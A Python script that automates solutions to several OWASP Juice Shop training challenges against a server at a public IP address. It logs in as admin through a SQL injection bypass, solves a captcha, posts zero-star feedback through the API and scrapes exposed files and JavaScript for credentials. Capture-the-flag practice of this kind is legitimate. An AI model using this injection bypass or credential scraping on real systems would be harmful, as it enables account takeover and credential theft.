#!/usr/bin/env python3
"""
Solve Multiple Challenges:
1. Missing Encoding - Access image with emoji in filename
2. Web3 Sandbox - Navigate to Web3 sandbox page
3. Zero Stars - Submit a review with zero stars
4. Exposed Credentials - Find exposed credentials in the application
"""

import requests
from playwright.sync_api import sync_playwright
import time
import json
import base64

TARGET = "http://66.42.93.220:3000"

def solve_missing_encoding():
    """Solve Missing Encoding challenge by accessing emoji image"""
    print("\n🎨 SOLVING MISSING ENCODING")
    print("-" * 40)
    
    session = requests.Session()
    
    # The image with emoji in filename that causes encoding issues
    emoji_image_url = f"{TARGET}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
    
    print(f"   Accessing emoji image: {emoji_image_url}")
    
    try:
        resp = session.get(emoji_image_url, timeout=10)
        if resp.status_code == 200:
            print("   ✅ Successfully accessed emoji image")
            return True
        else:
            print(f"   Status: {resp.status_code}")
    except Exception as e:
        print(f"   Error: {e}")
    
    # Alternative: Try with browser
    print("   Trying with browser...")
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        try:
            page.goto(emoji_image_url, wait_until="domcontentloaded", timeout=10000)
            print("   ✅ Accessed emoji image via browser")
            browser.close()
            return True
        except:
            browser.close()
    
    return False

def solve_web3_sandbox():
    """Solve Web3 Sandbox challenge by navigating to the page"""
    print("\n🌐 SOLVING WEB3 SANDBOX")
    print("-" * 40)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        print("   Navigating to Web3 Sandbox...")
        
        try:
            # Navigate to Web3 Sandbox
            page.goto(f"{TARGET}/#/web3", wait_until="networkidle", timeout=15000)
            time.sleep(2)
            
            print("   ✅ Successfully accessed Web3 Sandbox")
            browser.close()
            return True
        except Exception as e:
            print(f"   Error: {e}")
            browser.close()
    
    return False

def solve_zero_stars():
    """Solve Zero Stars challenge by submitting 0-star feedback"""
    print("\n⭐ SOLVING ZERO STARS")
    print("-" * 40)
    
    session = requests.Session()
    
    # Login first
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("   ✅ Logged in as admin")
    
    # Method 1: Submit 0-star feedback via API
    print("   Submitting 0-star feedback...")
    
    feedback_data = {
        "comment": "Zero stars test",
        "rating": 0,  # 0 stars
        "captcha": "0",
        "captchaId": 0
    }
    
    try:
        # Try different endpoints
        endpoints = [
            f"{TARGET}/api/Feedbacks/",
            f"{TARGET}/api/Feedbacks",
            f"{TARGET}/rest/feedback"
        ]
        
        for endpoint in endpoints:
            resp = session.post(endpoint, json=feedback_data)
            if resp.status_code in [200, 201]:
                print(f"   ✅ Submitted 0-star feedback via {endpoint}")
                return True
            else:
                print(f"   {endpoint}: {resp.status_code}")
    except Exception as e:
        print(f"   API Error: {e}")
    
    # Method 2: Use browser to submit 0-star review
    print("   Trying browser method...")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        page = browser.new_page()
        
        try:
            # Navigate to main page
            page.goto(TARGET, wait_until="networkidle", timeout=15000)
            time.sleep(2)
            
            # Dismiss cookie consent
            try:
                cookie_btn = page.locator('a:has-text("Me want it")').first
                if cookie_btn.is_visible():
                    cookie_btn.click()
                    time.sleep(1)
            except:
                pass
            
            # Login first
            account_btn = page.locator('#navbarAccount').first
            if account_btn.is_visible():
                account_btn.click()
                time.sleep(1)
                
                login_btn = page.locator('#navbarLoginButton').first
                if login_btn.is_visible():
                    login_btn.click()
                    time.sleep(2)
                    
                    # Fill login form
                    page.locator('#email').fill("admin@juice-sh.op'--")
                    page.locator('#password').fill("x")
                    page.locator('#loginButton').click()
                    time.sleep(3)
            
            # Navigate to customer feedback
            page.goto(f"{TARGET}/#/contact", wait_until="networkidle")
            time.sleep(2)
            
            # Fill feedback form WITHOUT selecting stars
            comment_field = page.locator('textarea[name="comment"], #comment').first
            if comment_field.is_visible():
                comment_field.fill("Zero star review test")
                
                # DON'T click any stars - leave it at 0
                
                # Solve captcha if needed
                captcha = page.locator('#captcha').first
                if captcha.is_visible():
                    captcha_text = captcha.inner_text()
                    # Simple math captcha solver
                    if '+' in captcha_text:
                        parts = captcha_text.split('+')
                        result = int(parts[0].strip()) + int(parts[1].split('=')[0].strip())
                        captcha_input = page.locator('#captchaControl').first
                        captcha_input.fill(str(result))
                
                # Submit without selecting stars
                submit_btn = page.locator('#submitButton, button[type="submit"]').first
                if submit_btn.is_visible():
                    submit_btn.click()
                    time.sleep(2)
                    print("   ✅ Submitted 0-star feedback via browser")
                    browser.close()
                    return True
            
            browser.close()
            
        except Exception as e:
            print(f"   Browser error: {e}")
            browser.close()
    
    return False

def solve_exposed_credentials():
    """Solve Exposed Credentials challenge"""
    print("\n🔓 SOLVING EXPOSED CREDENTIALS")
    print("-" * 40)
    
    session = requests.Session()
    
    # Common places to find exposed credentials:
    # 1. FTP directory
    # 2. Source code/JavaScript files
    # 3. API responses
    # 4. Configuration files
    
    print("   Searching for exposed credentials...")
    
    # Check FTP directory
    print("   Checking FTP directory...")
    ftp_url = f"{TARGET}/ftp"
    
    try:
        resp = session.get(ftp_url)
        if resp.status_code == 200:
            # Look for files that might contain credentials
            files_to_check = [
                "package.json",
                "coupons_2013.md.bak",
                "eastere.gg",
                "suspicious_errors.yml",
                "quarantine"
            ]
            
            for filename in files_to_check:
                try:
                    file_resp = session.get(f"{TARGET}/ftp/{filename}")
                    if file_resp.status_code == 200:
                        content = file_resp.text
                        
                        # Look for credentials patterns
                        if any(word in content.lower() for word in ['password', 'token', 'secret', 'key', 'credential']):
                            print(f"   Found potential credentials in {filename}")
                            
                            # Check for specific exposed credentials
                            if 'mc.safesearch' in content.lower() or 'Mr. N00dles' in content:
                                print(f"   ✅ Found MC SafeSearch credentials!")
                                return True
                except:
                    pass
    except:
        pass
    
    # Check main.js for exposed credentials
    print("   Checking JavaScript files...")
    
    js_files = [
        f"{TARGET}/main.js",
        f"{TARGET}/runtime.js",
        f"{TARGET}/polyfills.js",
        f"{TARGET}/vendor.js"
    ]
    
    for js_url in js_files:
        try:
            resp = session.get(js_url)
            if resp.status_code == 200:
                content = resp.text[:100000]  # Check first 100KB
                
                # Look for base64 encoded passwords or tokens
                import re
                b64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
                matches = re.findall(b64_pattern, content)
                
                for match in matches[:10]:  # Check first 10 matches
                    try:
                        decoded = base64.b64decode(match).decode('utf-8')
                        if 'password' in decoded.lower() or 'token' in decoded.lower():
                            print(f"   Found encoded credential: {decoded[:50]}...")
                    except:
                        pass
        except:
            pass
    
    # Check for exposed admin credentials in page source
    print("   Checking page source for hardcoded credentials...")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        try:
            page.goto(TARGET, wait_until="networkidle", timeout=15000)
            
            # Get page source
            content = page.content()
            
            # Look for credential patterns
            patterns = [
                r'password["\s:]+["\'](.*?)["\']',
                r'token["\s:]+["\'](.*?)["\']',
                r'admin@.*?password.*?["\']',
                r'MC\.SafeSearch.*?password'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    print(f"   Found exposed credential pattern: {matches[0][:30]}...")
            
            browser.close()
            
        except:
            browser.close()
    
    return False

def check_challenge_status():
    """Check which challenges are solved"""
    print("\n📊 CHECKING CHALLENGE STATUS")
    print("=" * 60)
    
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Get challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        
        # Check specific challenges
        target_challenges = [
            "Missing Encoding",
            "Web3 Sandbox", 
            "Zero Stars",
            "Exposed Credentials",
            "Mass Dispel"
        ]
        
        for name in target_challenges:
            challenge = next((c for c in challenges if name in c.get('name', '')), None)
            if challenge:
                status = "✅" if challenge.get('solved') else "❌"
                print(f"   {status} {name:<25} [{challenge.get('difficulty', '?')}⭐]")
        
        # Overall progress
        solved = sum(1 for c in challenges if c.get('solved'))
        total = len(challenges)
        print(f"\n   Overall Progress: {solved}/{total} ({solved*100//total}%)")

if __name__ == "__main__":
    print("🎯 SOLVING MULTIPLE CHALLENGES")
    print("=" * 60)
    
    # Solve each challenge
    solve_missing_encoding()
    solve_web3_sandbox()
    solve_zero_stars()
    solve_exposed_credentials()
    
    # Check final status
    check_challenge_status()